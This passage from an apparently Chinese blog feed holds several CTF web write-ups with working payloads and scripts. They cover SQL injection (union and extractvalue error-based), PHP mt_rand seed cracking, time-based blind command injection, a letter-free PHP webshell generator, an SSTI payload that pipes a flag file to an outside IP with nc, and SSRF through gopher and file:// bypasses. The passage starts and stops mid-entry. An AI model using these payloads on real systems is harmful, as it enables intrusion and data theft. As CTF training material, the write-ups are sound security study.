<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户名 : &#39; union select &quot;0f5ed8a8d8d44d86a570aacffa922251&quot;#</span><br><span class="line">密码  : ca01h</span><br></pre></td></tr></table></figure>
<p>可以登录，但是session里面的user不是admin。继续审计到<code>daochu.php</code>，SQL注入没有任何过滤，还有回显：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195332.png" alt=""></p>
<p>常规的SQL联合注入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195606.png" alt=""></p>
<p>有个hint表，接着读列名是hints。再dump数据：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701195655.png" alt=""></p>
<p>直接访问这个目录，和主页一样的界面，然而这里面没有www.zip了，接下来竟然要去lib文件夹里面去审计。。。😓</p>
<p>可以直接用find命令找一下PHP类型的文件，并且查看最近修改的文件，最后定位到<code>lib/webuploader/0.1.5/server/preview.php</code>，关键代码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200701200516.png" alt=""></p>
<p>构造一个符合正则表达式的POST数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:image&#x2F;test;base64,test</span><br></pre></td></tr></table></figure>
<p>题目返回了一个神秘文件，访问之后提示get file，所以就直接读flag就可以了。</p>
<blockquote>
<p>还有一种解法是webuploader 0.1.5的公开漏洞：</p>
<p><a href="https://9finger.cn/2020/03/06/CNVD-2018-26054%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">https://9finger.cn/2020/03/06/CNVD-2018-26054漏洞复现/#漏洞分析</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>首届钓鱼城杯CTF比赛</title>
    <url>/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF/</url>
    <content><![CDATA[<h1 id="“钓鱼城杯”国际网络安全技能大赛Writeup">“钓鱼城杯”国际网络安全技能大赛Writeup</h1>
<h2 id="easyseed">easyseed</h2>
<p>index.bak：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用php_mt_rand随机数种子爆破。<br>
用脚本生成php_mt_rand工具的参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>爆破seed<br>
<img src="https://uploader.shimo.im/f/8B6zswJk3nmcP932.png!thumbnail" alt="图片"></p>
<p>再生成key值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="string">&#x27;718225&#x27;</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $lock.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发送payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;nRtqGR8mtd9ZOPyI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lock&#x27;</span>: <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies, headers=headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<h2 id="easyweb">easyweb</h2>
<p>抓包</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906210414.png" alt=""></p>
<p>然后无回显命令执行，然后盲注一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://119.3.37.185/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;if [ `cut -c  &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF八月赛WP</title>
    <url>/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="DASCTF八月赛-Web-Writeup">DASCTF八月赛 Web Writeup</h1>
<h2 id="安恒大学">安恒大学</h2>
<h3 id="考点">考点</h3>
<ul>
<li>渗透测试</li>
<li>SQL报错注入</li>
</ul>
<h3 id="解题">解题</h3>
<p>y1ng师傅出的一道题，非常顶，可以说是这是一道实战改编题，y1ng师傅在做渗透测试时，在一个系统的某个不起眼的地方——邮件激活链接发现了SQL注入，并得到了全校所有学生的内网平台账号密码，而学生的所有信息、所有网上办事等等几乎都使用校内网平台的账号密码。</p>
<p>其实比赛的时候主办方也提醒了邮箱不要随便填，不过当时还是没能察觉到邮件激活链接中的一个参数存在SQL注入。</p>
<p>现在正式解题，直接看邮件激活链接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688</span><br></pre></td></tr></table></figure>
<p>注入点在username参数，说一下我的解题过程：</p>
<p>首先使SQL语句报错</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200253.png" alt=""></p>
<p>再尝试万能注入payload：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200602.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200905200658101.png" alt=""></p>
<p>好像可以使用盲注，再尝试<code>ca01h2' or if(length(select database())&gt;1, 1, 0)--+</code>，结果直接SQL语句报错</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200842.png" alt=""></p>
<p>盲注不行，联合注入被过滤，那么接着试一下报错注入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200951.png" alt=""></p>
<p>成功爆出当前用户名，接下来的工作就是拿数据。</p>
<p>爆表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p>一共有三个表：<code>student, teachers, users</code></p>
<p>爆列名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p>student表一共四个字段：<code>id, username, age, sex</code></p>
<p>teachers表：<code>id, f1aaaag, </code></p>
<p>爆数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<h2 id="rceme">rceme</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>无字母数字webshell</li>
</ul>
<h3 id="解题-v2">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you are not smart&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>过滤了所有字母数字和部分逻辑运算符以及常用于构造webshell的<code>^</code>、<code>~</code>、<code>&amp;</code>等符号。</p>
<p>但是还有一个逻辑运算符放出来了 <code>|</code>或运算。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905222802.png" alt=""></p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;	&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>应该是可以用python脚本fuzz出来的。</p>
<p>y1ng师傅的方法，直接不用或运算符，TQLLLLLL，代码看不太懂，膜就完事。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">	offset = <span class="number">3</span> + buff</span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	base = <span class="number">65</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		_ascii = ord(payload[i])</span><br><span class="line">		<span class="comment">#init</span></span><br><span class="line">		underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (len(payload) + offset + <span class="number">15</span>))</span><br><span class="line">		var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">		res += var;</span><br><span class="line">		tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> _ascii &gt; base:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(_ascii-base):</span><br><span class="line">				tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">		res += tmp</span><br><span class="line"></span><br><span class="line">	first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line">	<span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.构造STRTOLOWER并存进变量a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.构造SHOW_SOURCE并存进变量b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.构造/FLAG并存进变量c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#声明好abc变量</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.变量d = a(c) 则变量d为/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) 即为SHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"></span><br><span class="line">print(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="ezflask">ezflask</h2>
<h3 id="TODO">TODO</h3>
<h2 id="Reference">Reference</h2>
<p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p>
<p><a href="http://phoebe233.cn/?p=248">http://phoebe233.cn/?p=248</a></p>
<p><a href="https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">https://rce.moe/2020/08/25/GeekPwn-2020-云上挑战赛-cosplay-writeup/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow_1024杯_Web_Writeup</title>
    <url>/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup/</url>
    <content><![CDATA[<h1 id="CTFShow-1024杯-Web-Writeups">CTFShow 1024杯 Web Writeups</h1>
<h2 id="签到">签到</h2>
<p>一开始以为是无参数RCE，后来又Fuzz了PHP所有内置函数，趴着睡觉的时候突然灵光一现，刚刚好像看到出题人自定义了一个函数<code>ctfshow()</code>，直接使用这个函数即可。</p>
<h2 id="fastapi">fastapi</h2>
<p>直接去github上看fastapi的文档，发现它会自带Swagger UI文档，路径为<code>/docs</code>或者<code>/redoc</code><br>
根据这个api文档可以发现有一个POST接口<code>cccalccc</code>的参数p存在模板注入，fuzz一波之后发现还有过滤，ban掉了<code>open</code>,<code>eval</code>,<code>import</code>等关键字。但是payload只有搜集的够全面，就没有做不出来的SSTI。。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q&#x3D;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;cat &#x2F;mnt&#x2F;f1a9|nc 47.97.199.89 8888&#39;)</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/6DDDDE6F-2500-4258-9546-5E5527F4FC76.png" style="zoom:50%;" />
这里还有一个坑点就是，如果反弹shell的话会监听这边直接挂掉，只能每次单独的执行Linux命令。
<p>payload来源： <a href="https://blog.csdn.net/weixin_43536759/article/details/105066445">https://blog.csdn.net/weixin_43536759/article/details/105066445</a></p>
<p>另外还有一些其他无回显注入的方法： <a href="https://www.anquanke.com/post/id/188172#h2-12">https://www.anquanke.com/post/id/188172#h2-12</a></p>
<p>因为没有curl命令所以好像不能用DNSLOG的方法。</p>
<p>出题人的官方payload，使用时间盲注：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str(().__class__.__bases__[0].__subclasses__()[220](&quot;if [ &#96;cut -c 1 &#x2F;mnt&#x2F;f1a9&#96; &#x3D; &#39;f&#39; ];then sleep 4;fi&quot;,shell&#x3D;True).wait())</span><br></pre></td></tr></table></figure>
<h2 id="图片代理">图片代理</h2>
<p>打开题目显示一张图片，看URL还有<code>?picurl</code>参数，感觉是SSRF了，但是还得看看接下来怎么继续利用。<br>
首先用gopher协议验证一下是否确定是SSRF。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135548.png" alt=""></p>
<p>没毛病，确实是存在SSRF漏洞，再用dict协议看看有没有开放常用端口，比如redis的6379啥的。</p>
<p>一轮Fuzz下来只有80端口有回显，然后我又猜测会不会有其他的内网存活主机，又扫了一波没什么收获。然后用file协议读取本地文件的时候我好想忘了base64编码，结果以为是无回显的SSRF，又尝试了用DNSLOG外带数据等等，还是没能打出来。<br>
直到比赛结束后我才突然想到没有编码。。。（人傻了。。。</p>
<p>先读/etc/passwd正常回显，既然没有其他端口开着服务，那就去看Nginx的默认配置<code>/etc/nginx/conf.d/default.conf</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135617.png" style="zoom:50%;" />
<p>好吧，明明9000端口有fastcgi，为啥刚刚扫不到。用Gopherus本地生成fastcgi的payload</p>
<p>然后base64编码打过去拿到flag。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201028135643.png" alt=""></p>
<h2 id="柏拉图">柏拉图</h2>
<p>说实在的做这题的时候没考虑周全。。readfile.php不能读文件，index.php可以读文件。</p>
<p>双写绕过：file:/file:////var/www/html/index.php</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $bad = <span class="string">&#x27;file://&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/dict|127|localhost|sftp|Gopherus|http|\.\.\/|flag|[0-9]/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;难道我不知道你在想什么？除非绕过我？！&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      $url=str_replace($bad,<span class="string">&quot;&quot;</span>,$url);</span><br><span class="line">      curl($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在啦！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;文件存储在: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span 